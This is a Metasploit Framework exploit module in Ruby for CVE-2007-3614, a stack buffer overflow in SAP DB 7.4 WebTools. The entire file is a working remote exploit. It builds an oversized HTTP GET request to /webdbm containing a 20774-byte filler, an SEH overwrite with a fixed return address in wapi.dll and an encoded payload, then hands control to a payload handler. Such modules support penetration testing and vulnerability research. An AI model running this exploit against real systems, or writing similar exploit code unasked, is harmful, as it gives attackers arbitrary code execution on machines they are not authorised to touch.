##
# $Id: sapdb_webtools.rb 9842 2010-07-16 02:33:25Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GreatRanking

	HttpFingerprint = { :pattern => [ /SAP-Internet-SapDb-Server\// ] }

	include Msf::Exploit::Remote::HttpClient
	include Msf::Exploit::Remote::Seh

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'SAP DB 7.4 WebTools Buffer Overflow',
			'Description'    => %q{
					This module exploits a stack buffer overflow in SAP DB 7.4 WebTools.
				By sending an overly long GET request, it may be possible for
				an attacker to execute arbitrary code.
			},
			'Author'         => [ 'MC' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 9842 $',
			'References'     =>
				[
					[ 'CVE', '2007-3614' ],
					[ 'OSVDB', '37838' ],
					[ 'BID', '24773' ],
				],
			'Privileged'     => true,
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'thread',
				},
			'Payload'        =>
				{
					'Space'    => 850,
					'BadChars' => "\x00",
					'PrependEncoder' => "\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff",
					'EncoderType'    => Msf::Encoder::Type::AlphanumUpper,
					'EncoderOptions' =>
						{
							'BufferRegister' => 'ECX',
						},
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'SAP DB 7.4 WebTools', { 'Ret' => 0x1003c95a } ], # wapi.dll 7.4.3.0
				],
			'DisclosureDate' => 'Jul 5 2007',
			'DefaultTarget'  => 0))

		register_options( [ Opt::RPORT(9999) ], self.class )
	end

	def exploit

		filler = rand_text_alphanumeric(20774)
		seh = generate_seh_payload(target.ret)

		sploit = filler + seh + rand_text_alphanumeric(3000)

		print_status("Trying to exploit target #{target.name} 0x%.8x" % target.ret)

		res = send_request_raw(
			{
				'uri'   => '/webdbm',
				'query' => 'Event=DBM_INTERN_TEST&Action=REFRESH&HTTP_COOKIE=' + sploit
			}, 5)

		handler

	end

end
